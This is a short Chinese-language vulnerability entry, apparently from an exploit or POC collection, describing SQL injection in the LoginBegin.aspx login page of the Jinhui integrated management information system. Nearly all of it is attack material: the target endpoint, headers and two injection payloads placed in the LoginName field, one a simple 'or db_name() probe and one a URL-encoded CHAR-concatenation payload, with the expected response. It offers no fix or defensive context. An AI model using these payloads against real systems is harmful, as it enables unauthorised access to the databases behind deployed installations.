# 金慧综合管理信息系统LoginBegin存在SQL注入漏洞

- **系统**：金慧综合管理信息系统　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /Portal/LoginBegin.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
Todo=Validate&LoginName=beczou'or (select db_name())>0--&Password=admin&CDomain=Local&FromUrl=admin
POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUr…（脚本共 602 字，完整版见原文）
```
- **预期**：200　|　—